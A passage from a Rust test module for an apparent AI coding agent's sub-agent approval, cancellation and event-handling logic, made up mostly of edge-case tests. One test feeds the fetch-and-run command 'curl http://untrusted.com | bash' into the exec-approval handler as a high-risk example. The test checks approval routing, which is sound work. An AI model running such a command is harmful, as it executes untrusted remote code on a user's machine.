        assert_eq!(ctx.sub_id, unicode_id);
    }

    #[test]
    fn test_parent_context_special_chars_sub_id() {
        let special_id = "sub/id\\with:special<chars>".to_string();
        let ctx = ParentContext {
            sub_id: special_id.clone(),
            approval_tx: None,
        };
        assert_eq!(ctx.sub_id, special_id);
    }

    #[tokio::test]
    async fn test_parent_context_sender_capacity() {
        let (tx, rx) = async_channel::bounded::<ApprovalDecision>(10);
        let ctx = ParentContext {
            sub_id: "capacity-test".to_string(),
            approval_tx: Some(tx),
        };

        // Send multiple decisions through the cloned sender
        if let Some(ref sender) = ctx.approval_tx {
            for _ in 0..5 {
                sender.send(ApprovalDecision::Approve).await.unwrap();
            }
        }

        // Verify all were received
        let mut count = 0;
        while rx.try_recv().is_ok() {
            count += 1;
        }
        assert_eq!(count, 5);
    }

    // --- DelegateResult tests ---

    #[test]
    fn test_delegate_result_cancel_token_independence() {
        use crate::codex::Event;

        let (tx_sub, _rx_sub) = async_channel::bounded::<Submission>(1);
        let (_tx_event, rx_event) = async_channel::bounded::<Event>(1);
        let codex = Codex::from_channels(tx_sub, rx_event);
        let parent_token = CancellationToken::new();

        let delegate = DelegateResult {
            codex,
            cancel_token: parent_token.child_token(),
        };

        // Child token not cancelled initially
        assert!(!delegate.cancel_token.is_cancelled());

        // Cancelling parent should cancel child
        parent_token.cancel();
        assert!(delegate.cancel_token.is_cancelled());
    }

    // --- is_terminal_event exhaustive tests ---

    #[test]
    fn test_is_terminal_event_reasoning_delta_long_not_terminal() {
        use crate::codex::Event;

        let delta = Event::ReasoningDelta {
            content: "x".repeat(10000),
        };
        assert!(!is_terminal_event(&delta));
    }

    #[test]
    fn test_is_terminal_event_reasoning_delta_empty_not_terminal() {
        use crate::codex::Event;

        let delta = Event::ReasoningDelta {
            content: "".to_string(),
        };
        assert!(!is_terminal_event(&delta));
    }

    #[test]
    fn test_is_terminal_event_undo_complete_not_terminal() {
        use crate::codex::Event;

        let undo = Event::UndoComplete {
            description: "Restored to previous state".to_string(),
        };
        assert!(!is_terminal_event(&undo));
    }

    #[test]
    fn test_is_terminal_event_turn_complete_various_values() {
        use crate::codex::Event;

        // Empty response
        let e1 = Event::TurnComplete {
            submission_id: "".to_string(),
            turn: 0,
            response: "".to_string(),
        };
        assert!(is_terminal_event(&e1));

        // Large turn number
        let e2 = Event::TurnComplete {
            submission_id: "max".to_string(),
            turn: u32::MAX,
            response: "x".repeat(10000),
        };
        assert!(is_terminal_event(&e2));
    }

    #[test]
    fn test_is_terminal_event_session_complete_various_values() {
        use crate::codex::Event;

        // Zero turns
        let e1 = Event::SessionComplete {
            session_id: "".to_string(),
            total_turns: 0,
            status: "".to_string(),
        };
        assert!(is_terminal_event(&e1));

        // Large values
        let e2 = Event::SessionComplete {
            session_id: "x".repeat(1000),
            total_turns: u32::MAX,
            status: "complete with all the things".to_string(),
        };
        assert!(is_terminal_event(&e2));
    }

    // --- handle_exec_approval extended tests ---

    #[tokio::test]
    async fn test_handle_exec_approval_unicode_command() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "unicode".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        let decision = handle_exec_approval_request(
            &parent_ctx,
            "unicode-cmd",
            "echo '你好世界' && echo 'Ελληνικά'",
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Low,
                reason: "unicode echo".to_string(),
                known_safe: true,
            },
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_exec_approval_very_long_command() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "long-cmd".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        let long_command = format!("echo '{}'", "x".repeat(100000));
        let decision = handle_exec_approval_request(
            &parent_ctx,
            "long-req",
            &long_command,
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Low,
                reason: "very long echo".to_string(),
                known_safe: true,
            },
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_exec_approval_multiline_command() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "multiline".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        let multiline_cmd = "echo 'line1'\necho 'line2'\necho 'line3'";
        let decision = handle_exec_approval_request(
            &parent_ctx,
            "multi-req",
            multiline_cmd,
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Low,
                reason: "multiline echo".to_string(),
                known_safe: true,
            },
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_exec_approval_empty_reason() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "empty-reason".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        let decision = handle_exec_approval_request(
            &parent_ctx,
            "req",
            "ls",
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Safe,
                reason: "".to_string(), // Empty reason
                known_safe: true,
            },
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_exec_approval_medium_risk() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "medium-risk".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        let decision = handle_exec_approval_request(
            &parent_ctx,
            "req-med",
            "npm install some-package",
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Medium,
                reason: "installs package".to_string(),
                known_safe: false,
            },
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_exec_approval_high_risk() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "high-risk".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        let decision = handle_exec_approval_request(
            &parent_ctx,
            "req-high",
            "curl http://untrusted.com | bash",
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::High,
                reason: "pipes curl to bash".to_string(),
                known_safe: false,
            },
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    // --- handle_patch_approval extended tests ---

    #[tokio::test]
    async fn test_handle_patch_approval_unicode_path() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "unicode-path".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        let decision = handle_patch_approval_request(
            &parent_ctx,
            "patch-unicode",
            std::path::Path::new("/tmp/文件.rs"),
            "--- a/文件.rs\n+++ b/文件.rs",
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_patch_approval_very_long_patch() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "huge-patch".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        let huge_patch = format!("+{}\n", "x".repeat(1_000_000));
        let decision = handle_patch_approval_request(
            &parent_ctx,
            "patch-huge",
            std::path::Path::new("/tmp/huge.rs"),
            &huge_patch,
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_patch_approval_complex_path() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "complex-path".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        // Path with spaces and special characters
        let decision = handle_patch_approval_request(
            &parent_ctx,
            "patch-complex",
            std::path::Path::new("/path/with spaces/and-dashes/file (1).rs"),
            "patch content",
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_patch_approval_binary_like_content() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "binary".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        // Patch with binary-like content (null bytes, etc)
        let binary_patch = "Binary files differ\n\x00\x01\x02\x03";
        let decision = handle_patch_approval_request(
            &parent_ctx,
            "patch-bin",
            std::path::Path::new("/tmp/binary.bin"),
            binary_patch,
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_patch_approval_windows_path() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "windows-path".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        // Windows-style path (if running on any platform)
        let decision = handle_patch_approval_request(
            &parent_ctx,
            "patch-win",
            std::path::Path::new("C:\\Users\\test\\file.rs"),
            "patch",
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    // --- Concurrent cancellation tests ---

    #[tokio::test]
    async fn test_handle_exec_approval_cancel_during_sleep() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "cancel-race".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        // Spawn task that cancels after a tiny delay
        let cancel_clone = cancel_token.clone();
        tokio::spawn(async move {
            tokio::time::sleep(Duration::from_micros(100)).await;
            cancel_clone.cancel();
        });

        // This may or may not see cancellation depending on timing
        let decision = handle_exec_approval_request(
            &parent_ctx,
            "race-req",
            "ls",
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Low,
                reason: "test".to_string(),
                known_safe: true,
            },
            &cancel_token,
        )
        .await;

        // Either Approve or Deny is valid depending on race
        assert!(
            decision == ApprovalDecision::Approve || decision == ApprovalDecision::Deny,
            "Expected Approve or Deny, got {:?}",
            decision
        );
    }

    #[tokio::test]
    async fn test_handle_patch_approval_cancel_during_sleep() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "patch-race".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        // Spawn task that cancels after a tiny delay
        let cancel_clone = cancel_token.clone();
        tokio::spawn(async move {
            tokio::time::sleep(Duration::from_micros(100)).await;
            cancel_clone.cancel();
        });

        let decision = handle_patch_approval_request(
            &parent_ctx,
            "patch-race",
            std::path::Path::new("/tmp/test.rs"),
            "patch",
            &cancel_token,
        )
        .await;

        // Either Approve or Deny is valid depending on race
        assert!(decision == ApprovalDecision::Approve || decision == ApprovalDecision::Deny);
    }

    // --- Multiple delegates tests ---

    #[tokio::test]
    async fn test_multiple_delegates_independent_cancellation() {
        let config = Config::default();
        let callback: Arc<dyn StreamCallback> = Arc::new(NullStreamCallback);
        let parent_ctx = Arc::new(ParentContext::default());

        let cancel1 = CancellationToken::new();
        let cancel2 = CancellationToken::new();

        let result1 = run_codex_conversation_interactive(
            config.clone(),
            Arc::clone(&callback),
            Arc::clone(&parent_ctx),
            cancel1.clone(),
        )
        .await;

        let result2 =
            run_codex_conversation_interactive(config, callback, parent_ctx, cancel2.clone()).await;

        assert!(result1.is_ok());
        assert!(result2.is_ok());

        let delegate1 = result1.unwrap();
        let delegate2 = result2.unwrap();

        // Cancel only the first
        cancel1.cancel();

        // Second should still be active
        assert!(!cancel2.is_cancelled());
        assert!(!delegate2.cancel_token.is_cancelled());

        // Clean up
        cancel2.cancel();
        let _ = delegate1.codex.submit(Op::Shutdown).await;
        let _ = delegate2.codex.submit(Op::Shutdown).await;
    }

    // --- Empty and edge case approval requests ---

    #[tokio::test]
    async fn test_handle_exec_approval_empty_id() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "empty-id".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        let decision = handle_exec_approval_request(
            &parent_ctx,
            "", // Empty ID
            "ls",
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Safe,
                reason: "test".to_string(),
                known_safe: true,
            },
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_patch_approval_empty_id() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "empty-patch-id".to_string(),
            approval_tx: Some(tx),
        };
        let cancel_token = CancellationToken::new();

        let decision = handle_patch_approval_request(
            &parent_ctx,
            "", // Empty ID
            std::path::Path::new("/tmp/test.rs"),
            "patch",
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_exec_approval_all_safe_risk() {
        let parent_ctx = ParentContext::default();
        let cancel_token = CancellationToken::new();

        // Even Safe risk without parent channel should deny
        let decision = handle_exec_approval_request(
            &parent_ctx,
            "safe-req",
            "pwd",
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Safe,
                reason: "completely safe".to_string(),
                known_safe: true,
            },
            &cancel_token,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Deny);
    }

    // --- Cancellation token state tests ---

    #[tokio::test]
    async fn test_cancel_token_child_relationship() {
        let parent = CancellationToken::new();
        let child1 = parent.child_token();
        let child2 = parent.child_token();

        assert!(!parent.is_cancelled());
        assert!(!child1.is_cancelled());
        assert!(!child2.is_cancelled());

        // Cancelling parent cancels all children
        parent.cancel();

        assert!(parent.is_cancelled());
        assert!(child1.is_cancelled());
        assert!(child2.is_cancelled());
    }

    #[tokio::test]
    async fn test_cancel_token_child_independence() {
        let parent = CancellationToken::new();
        let child1 = parent.child_token();
        let child2 = parent.child_token();

        // Cancelling one child doesn't affect others
        child1.cancel();

        assert!(!parent.is_cancelled());
        assert!(child1.is_cancelled());
        assert!(!child2.is_cancelled());
    }

    // --- run_codex_conversation_one_shot partial tests ---
    // Note: Full one_shot test requires a working Codex with mock LLM

    #[tokio::test]
    async fn test_is_terminal_event_all_abort_reasons_exhaustive() {
        use crate::codex::{AbortReason, Event};

        // Verify every possible AbortReason creates a terminal event
        let abort_reasons = [
            AbortReason::UserInterrupt,
            AbortReason::TurnLimit,
            AbortReason::ApprovalDenied,
            AbortReason::Shutdown,
            AbortReason::Error {
                message: String::new(),
            },
            AbortReason::Error {
                message: "some error message".to_string(),
            },
            AbortReason::Error {
                message: "x".repeat(10000),
            },
        ];

        for reason in abort_reasons {
            let event = Event::TurnAborted {
                submission_id: "test".to_string(),
                reason,
            };
            assert!(
                is_terminal_event(&event),
                "Expected TurnAborted to be terminal"
            );
        }
    }

    #[test]
    fn test_is_terminal_event_shutdown_complete_not_terminal() {
        use crate::codex::Event;

        let event = Event::ShutdownComplete;
        assert!(!is_terminal_event(&event));
    }

    #[test]
    fn test_is_terminal_event_models_available_not_terminal() {
        use crate::codex::Event;

        let event = Event::ModelsAvailable { models: vec![] };
        assert!(!is_terminal_event(&event));
    }

    #[test]
    fn test_is_terminal_event_error_recoverable_not_terminal() {
        use crate::codex::Event;

        // Recoverable error is not terminal
        let event = Event::Error {
            submission_id: Some("sub".to_string()),
            message: "recoverable error".to_string(),
            recoverable: true,
        };
        assert!(!is_terminal_event(&event));

        // Non-recoverable error is still not terminal (turn/session events are terminal)
        let event_non_recov = Event::Error {
            submission_id: None,
            message: "fatal error".to_string(),
            recoverable: false,
        };
        assert!(!is_terminal_event(&event_non_recov));
    }

    #[test]
    fn test_is_terminal_event_tool_started_long_values() {
        use crate::codex::Event;

        let event = Event::ToolStarted {
            tool: "x".repeat(10000),
            call_id: "y".repeat(10000),
        };
        assert!(!is_terminal_event(&event));
    }

    #[test]
    fn test_is_terminal_event_tool_complete_various() {
        use crate::codex::Event;

        // Success case
        let event_success = Event::ToolComplete {
            tool: "shell".to_string(),
            call_id: "call-123".to_string(),
            success: true,
            result: "output".to_string(),
        };
        assert!(!is_terminal_event(&event_success));

        // Failure case
        let event_failure = Event::ToolComplete {
            tool: "file_read".to_string(),
            call_id: "call-456".to_string(),
            success: false,
            result: "file not found".to_string(),
        };
        assert!(!is_terminal_event(&event_failure));

        // Empty values
        let event_empty = Event::ToolComplete {
            tool: "".to_string(),
            call_id: "".to_string(),
            success: false,
            result: "".to_string(),
        };
        assert!(!is_terminal_event(&event_empty));
    }

    #[test]
    fn test_is_terminal_event_turn_started_various() {
        use crate::codex::Event;

        let e1 = Event::TurnStarted {
            submission_id: "".to_string(),
            turn: 0,
        };
        assert!(!is_terminal_event(&e1));

        let e2 = Event::TurnStarted {
            submission_id: "x".repeat(1000),
            turn: u32::MAX,
        };
        assert!(!is_terminal_event(&e2));
    }

    #[test]
    fn test_is_terminal_event_reasoning_started_various() {
        use crate::codex::Event;

        let e1 = Event::ReasoningStarted { turn: 0 };
        assert!(!is_terminal_event(&e1));

        let e2 = Event::ReasoningStarted { turn: u32::MAX };
        assert!(!is_terminal_event(&e2));
    }

    #[test]
    fn test_is_terminal_event_reasoning_complete_various() {
        use crate::codex::Event;

        let e1 = Event::ReasoningComplete {
            turn: 0,
            duration_ms: 0,
            has_tool_calls: false,
        };
        assert!(!is_terminal_event(&e1));

        let e2 = Event::ReasoningComplete {
            turn: u32::MAX,
            duration_ms: u64::MAX,
            has_tool_calls: true,
        };
        assert!(!is_terminal_event(&e2));
    }

    #[test]
    fn test_is_terminal_event_token_usage_various() {
        use crate::codex::Event;

        let e1 = Event::TokenUsage {
            input_tokens: 0,
            output_tokens: 0,
            cost_usd: None,
        };
        assert!(!is_terminal_event(&e1));

        let e2 = Event::TokenUsage {
            input_tokens: u64::MAX,
            output_tokens: u64::MAX,
            cost_usd: Some(f64::MAX),
        };
        assert!(!is_terminal_event(&e2));
    }

    #[test]
    fn test_is_terminal_event_compacted_various() {
        use crate::codex::Event;

        let e1 = Event::Compacted {
            original_tokens: 0,
            new_tokens: 0,
        };
        assert!(!is_terminal_event(&e1));

        let e2 = Event::Compacted {
            original_tokens: u64::MAX,
            new_tokens: u64::MAX,
        };
        assert!(!is_terminal_event(&e2));
    }

    // ============================================================================
    // Additional test coverage (N=293)
    // ============================================================================

    // --- SubAgentSource additional coverage ---

    #[test]
    fn test_sub_agent_source_review_properties() {
        let source = SubAgentSource::Review;
        assert_eq!(format!("{:?}", source), "Review");
        let cloned = source.clone();
        assert_eq!(cloned, SubAgentSource::Review);
    }

    #[test]
    fn test_sub_agent_source_task_properties() {
        let source = SubAgentSource::Task;
        assert_eq!(format!("{:?}", source), "Task");
        let cloned = source.clone();
        assert_eq!(cloned, SubAgentSource::Task);
    }

    #[test]
    fn test_sub_agent_source_analysis_properties() {
        let source = SubAgentSource::Analysis;
        assert_eq!(format!("{:?}", source), "Analysis");
        let cloned = source.clone();
        assert_eq!(cloned, SubAgentSource::Analysis);
    }

    #[test]
    fn test_sub_agent_source_eq_against_all_variants() {
        let review = SubAgentSource::Review;
        let task = SubAgentSource::Task;
        let analysis = SubAgentSource::Analysis;

        // Self equality
        assert!(review == SubAgentSource::Review);
        assert!(task == SubAgentSource::Task);
        assert!(analysis == SubAgentSource::Analysis);

        // Cross inequality
        assert!(review != task);
        assert!(review != analysis);
        assert!(task != analysis);
    }

    #[test]
    fn test_sub_agent_source_pattern_matching() {
        let sources = [
            SubAgentSource::Review,
            SubAgentSource::Task,
            SubAgentSource::Analysis,
        ];

        let mut review_count = 0;
        let mut task_count = 0;
        let mut analysis_count = 0;

        for source in &sources {
            match source {
                SubAgentSource::Review => review_count += 1,
                SubAgentSource::Task => task_count += 1,
                SubAgentSource::Analysis => analysis_count += 1,
            }
        }

        assert_eq!(review_count, 1);
        assert_eq!(task_count, 1);
        assert_eq!(analysis_count, 1);
    }

    // --- ParentContext additional coverage ---

    #[test]
    fn test_parent_context_with_whitespace_sub_id() {
        let ctx = ParentContext {
            sub_id: "   spaces   ".to_string(),
            approval_tx: None,
        };
        assert_eq!(ctx.sub_id, "   spaces   ");
    }

    #[test]
    fn test_parent_context_with_newline_sub_id() {
        let ctx = ParentContext {
            sub_id: "line1\nline2".to_string(),
            approval_tx: None,
        };
        assert!(ctx.sub_id.contains('\n'));
    }

    #[tokio::test]
    async fn test_parent_context_sender_recv() {
        let (tx, rx) = async_channel::bounded::<ApprovalDecision>(5);
        let ctx = ParentContext {
            sub_id: "test-recv".to_string(),
            approval_tx: Some(tx),
        };

        // Send through context
        if let Some(sender) = &ctx.approval_tx {
            sender.send(ApprovalDecision::Approve).await.unwrap();
            sender.send(ApprovalDecision::Deny).await.unwrap();
            sender
                .send(ApprovalDecision::ApproveAndRemember)
                .await
                .unwrap();
        }

        // Receive in order
        assert_eq!(rx.recv().await.unwrap(), ApprovalDecision::Approve);
        assert_eq!(rx.recv().await.unwrap(), ApprovalDecision::Deny);
        assert_eq!(
            rx.recv().await.unwrap(),
            ApprovalDecision::ApproveAndRemember
        );
    }

    #[test]
    fn test_parent_context_clone_independence() {
        let ctx1 = ParentContext {
            sub_id: "original".to_string(),
            approval_tx: None,
        };
        let mut ctx2 = ctx1.clone();
        ctx2.sub_id = "modified".to_string();

        assert_eq!(ctx1.sub_id, "original");
        assert_eq!(ctx2.sub_id, "modified");
    }

    // --- DelegateResult additional coverage ---

    #[test]
    fn test_delegate_result_fields_accessible() {
        use crate::codex::Event;

        let (tx, _rx) = async_channel::bounded::<Submission>(1);
        let (_tx_e, rx_e) = async_channel::bounded::<Event>(1);
        let codex = Codex::from_channels(tx, rx_e);
        let cancel = CancellationToken::new();

        let result = DelegateResult {
            codex,
            cancel_token: cancel.child_token(),
        };

        // Verify cancel_token is not cancelled
        assert!(!result.cancel_token.is_cancelled());
    }

    #[test]
    fn test_delegate_result_cancel_propagation() {
        use crate::codex::Event;

        let (tx, _rx) = async_channel::bounded::<Submission>(1);
        let (_tx_e, rx_e) = async_channel::bounded::<Event>(1);
        let codex = Codex::from_channels(tx, rx_e);
        let parent = CancellationToken::new();

        let result = DelegateResult {
            codex,
            cancel_token: parent.child_token(),
        };

        // Not cancelled yet
        assert!(!result.cancel_token.is_cancelled());

        // Cancel parent
        parent.cancel();

        // Child should now be cancelled
        assert!(result.cancel_token.is_cancelled());
    }

    // --- is_terminal_event exhaustive additional coverage ---

    #[test]
    fn test_is_terminal_event_reasoning_delta_various() {
        use crate::codex::Event;

        let event = Event::ReasoningDelta {
            content: "streaming reasoning...".to_string(),
        };
        assert!(!is_terminal_event(&event));

        let event_empty = Event::ReasoningDelta {
            content: String::new(),
        };
        assert!(!is_terminal_event(&event_empty));

        let event_long = Event::ReasoningDelta {
            content: "x".repeat(100000),
        };
        assert!(!is_terminal_event(&event_long));
    }

    #[test]
    fn test_is_terminal_event_turn_complete_edge_cases() {
        use crate::codex::Event;

        // Empty strings
        let e1 = Event::TurnComplete {
            submission_id: String::new(),
            turn: 0,
            response: String::new(),
        };
        assert!(is_terminal_event(&e1));

        // Very long strings
        let e2 = Event::TurnComplete {
            submission_id: "x".repeat(10000),
            turn: 999999,
            response: "y".repeat(100000),
        };
        assert!(is_terminal_event(&e2));

        // Unicode
        let e3 = Event::TurnComplete {
            submission_id: "会话".to_string(),
            turn: 42,
            response: "Ответ".to_string(),
        };
        assert!(is_terminal_event(&e3));
    }

    #[test]
    fn test_is_terminal_event_session_complete_edge_cases() {
        use crate::codex::Event;

        let e1 = Event::SessionComplete {
            session_id: String::new(),
            total_turns: 0,
            status: String::new(),
        };
        assert!(is_terminal_event(&e1));

        let e2 = Event::SessionComplete {
            session_id: "long-".repeat(2000),
            total_turns: u32::MAX,
            status: "completed with maximum turns".to_string(),
        };
        assert!(is_terminal_event(&e2));
    }

    // --- Approval decision tests ---

    #[tokio::test]
    async fn test_handle_exec_approval_safe_risk() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "safe".to_string(),
            approval_tx: Some(tx),
        };
        let cancel = CancellationToken::new();

        let decision = handle_exec_approval_request(
            &parent_ctx,
            "req",
            "pwd",
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Safe,
                reason: "always safe".to_string(),
                known_safe: true,
            },
            &cancel,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_exec_approval_long_command() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "long".to_string(),
            approval_tx: Some(tx),
        };
        let cancel = CancellationToken::new();

        let long_cmd = "echo ".to_string() + &"x".repeat(50000);
        let decision = handle_exec_approval_request(
            &parent_ctx,
            "req-long",
            &long_cmd,
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Low,
                reason: "long echo".to_string(),
                known_safe: true,
            },
            &cancel,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_exec_approval_unicode_id() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "unicode-测试".to_string(),
            approval_tx: Some(tx),
        };
        let cancel = CancellationToken::new();

        let decision = handle_exec_approval_request(
            &parent_ctx,
            "请求-123",
            "ls",
            &crate::codex::CommandAssessment {
                risk: crate::codex::RiskLevel::Low,
                reason: "测试".to_string(),
                known_safe: true,
            },
            &cancel,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_patch_approval_unicode_path_and_content() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "unicode-patch".to_string(),
            approval_tx: Some(tx),
        };
        let cancel = CancellationToken::new();

        let decision = handle_patch_approval_request(
            &parent_ctx,
            "patch-日本語",
            std::path::Path::new("/tmp/文件.rs"),
            "--- a/文件.rs\n+++ b/文件.rs",
            &cancel,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    #[tokio::test]
    async fn test_handle_patch_approval_very_deep_path() {
        let (tx, _rx) = async_channel::bounded(1);
        let parent_ctx = ParentContext {
            sub_id: "deep-path".to_string(),
            approval_tx: Some(tx),
        };
        let cancel = CancellationToken::new();

        let deep_path = format!("/a{}/file.rs", "/b".repeat(100));
        let decision = handle_patch_approval_request(
            &parent_ctx,
            "patch-deep",
            std::path::Path::new(&deep_path),
            "patch",
            &cancel,
        )
        .await;

        assert_eq!(decision, ApprovalDecision::Approve);
    }

    // --- CancellationToken behavior tests ---

    #[tokio::test]
    async fn test_cancellation_token_multiple_children() {
        let parent = CancellationToken::new();
        let child1 = parent.child_token();
        let child2 = parent.child_token();
        let grandchild = child1.child_token();

        assert!(!parent.is_cancelled());
        assert!(!child1.is_cancelled());
        assert!(!child2.is_cancelled());
        assert!(!grandchild.is_cancelled());

        parent.cancel();

        assert!(parent.is_cancelled());
        assert!(child1.is_cancelled());
        assert!(child2.is_cancelled());
        assert!(grandchild.is_cancelled());
    }

    #[tokio::test]
    async fn test_cancellation_child_cancel_does_not_affect_sibling() {
        let parent = CancellationToken::new();
        let child1 = parent.child_token();
        let child2 = parent.child_token();

        child1.cancel();

        assert!(!parent.is_cancelled());
        assert!(child1.is_cancelled());
        assert!(!child2.is_cancelled());
    }

    // --- Interactive conversation tests ---

    #[tokio::test]
    async fn test_interactive_with_pre_cancelled_token() {
        let config = Config::default();
        let callback = Arc::new(NullStreamCallback);
        let parent_ctx = Arc::new(ParentContext::default());
        let cancel = CancellationToken::new();
        cancel.cancel(); // Pre-cancel

        let result =
            run_codex_conversation_interactive(config, callback, parent_ctx, cancel.clone()).await;

        // Should still succeed in creating the delegate
        assert!(result.is_ok());

        let delegate = result.unwrap();
        // Clean up
        let _ = delegate.codex.submit(Op::Shutdown).await;
    }

    #[tokio::test]
    async fn test_interactive_with_empty_sub_id() {
        let parent_ctx = Arc::new(ParentContext {
            sub_id: String::new(),
            approval_tx: None,
        });

        let config = Config::default();
        let callback = Arc::new(NullStreamCallback);
        let cancel = CancellationToken::new();

        let result =
            run_codex_conversation_interactive(config, callback, parent_ctx, cancel.clone()).await;

        assert!(result.is_ok());
        let delegate = result.unwrap();
        cancel.cancel();
        let _ = delegate.codex.submit(Op::Shutdown).await;
    }

    // --- Submission channel tests ---

    #[test]
    fn test_submission_struct_creation() {
        let sub = Submission {
            id: "test-id".to_string(),
            op: Op::Shutdown,
        };

        assert_eq!(sub.id, "test-id");
        matches!(sub.op, Op::Shutdown);
    }

    #[test]
    fn test_submission_with_user_input_op() {
        let sub = Submission {
            id: "input-1".to_string(),
            op: Op::UserInput {
                message: "Hello".to_string(),
                context: vec![],
            },
        };

        assert_eq!(sub.id, "input-1");
    }

    #[test]
    fn test_submission_with_exec_approval_op() {
        let sub = Submission {
            id: "approval-1".to_string(),
            op: Op::ExecApproval {
                id: "exec-123".to_string(),
                decision: ApprovalDecision::Approve,
            },
        };

        assert_eq!(sub.id, "approval-1");
    }

    #[test]
    fn test_submission_with_patch_approval_op() {
        let sub = Submission {
            id: "patch-approval-1".to_string(),
            op: Op::PatchApproval {
                id: "patch-123".to_string(),
                decision: ApprovalDecision::Deny,
            },
        };

        assert_eq!(sub.id, "patch-approval-1");
    }

    // --- Async channel behavior tests ---

    #[tokio::test]
    async fn test_async_channel_bounded_capacity() {
        let (tx, rx) = async_channel::bounded::<ApprovalDecision>(3);

        // Fill the channel
        tx.send(ApprovalDecision::Approve).await.unwrap();
        tx.send(ApprovalDecision::Deny).await.unwrap();
        tx.send(ApprovalDecision::ApproveAndRemember).await.unwrap();

        // Channel should be full now
        assert!(tx.try_send(ApprovalDecision::Approve).is_err());

        // Receive one
        let _ = rx.recv().await.unwrap();

        // Now we can send again
